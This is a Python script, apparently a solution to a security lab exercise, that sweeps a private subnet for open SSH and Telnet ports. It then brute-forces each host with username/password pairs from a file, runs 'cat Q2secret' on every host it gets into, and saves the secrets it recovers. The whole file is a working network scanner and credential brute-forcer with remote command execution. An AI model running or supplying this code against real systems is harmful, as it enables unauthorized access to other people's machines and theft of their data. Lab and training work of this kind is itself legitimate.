import paramiko, telnetlib, socket


subnet = "172.16.48."


passwordFile = open("Q2pwd", "r")
logins = [i.strip().split() for i in passwordFile.readlines()]
passwordFile.close()


telnet_serv = []
ssh_serv = []




def check_ssh():
    for ip in range(256):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        connect_ip = subnet + str(ip)
        error_ind = s.connect_ex((connect_ip,22))
        if error_ind == 0:
            print("For", connect_ip, "- Port 22 is open")
            ssh_serv.append(connect_ip)
            s.close()
        else:
            s.close()
           
def check_telnet():
    for ip in range(256):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        connect_ip = subnet + str(ip)
        error_ind = s.connect_ex((connect_ip, 23))
        if error_ind == 0:
            print("For", connect_ip, "- Port 23 is open")
            telnet_serv.append(connect_ip)
            s.close()
        else:
            s.close()


def connect_telnet(ip):
    for i in range(len(logins)):
        try:
            telnet = telnetlib.Telnet(ip, timeout=2)
            telnet.read_until(b"login: ")
            telnet.write(logins[i][0].encode('ascii')+ b"\n")
            if logins[i][1]:
                telnet.read_until(b"Password: ")
                telnet.write(logins[i][1].encode('ascii') + b"\n")
            telnet.write(b"cat Q2secret\n")
            telnet.write(b"exit\n")
            secret_temp = telnet.read_all().decode("ascii").split("\n")
            print(secret_temp)
            secret = secret_temp[-2][1:].strip()
            telnet.close()
            print("Sucess |", ip, "| 23 | username:", logins[i][0], "| password:", logins[i][1], "| secret:", secret)
            with open("Solutions/Q2secrets", "a+") as f:
                f.write(secret)
            return True
        except:
            continue
    return False
           
def connect_ssh(ip, user_passw):
    for i in range(len(user_passw)):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, 22, user_passw[i][0], user_passw[i][1], timeout=15, banner_timeout=15)
            _stdin, _stdout, _stderr = ssh.exec_command("cat Q2secret")
            secret = _stdout.read().decode()
            ssh.close()
            print("Sucess |", ip,"| 22 | username:", user_passw[i][0], "| password:", user_passw[i][1], "| secret:", secret)
            with open("Solutions/Q2secrets", "a+") as f:
                f.write(secret)
            return True
        except paramiko.ssh_exception.AuthenticationException:
            pass
        except paramiko.ssh_exception.SSHException:
            return connect_ssh(ip, user_passw[i:])
    return False


check_telnet()      
check_ssh()


for t in telnet_serv:
    connect_telnet(t)
for s in ssh_serv:
    print(s, connect_ssh(s, logins))
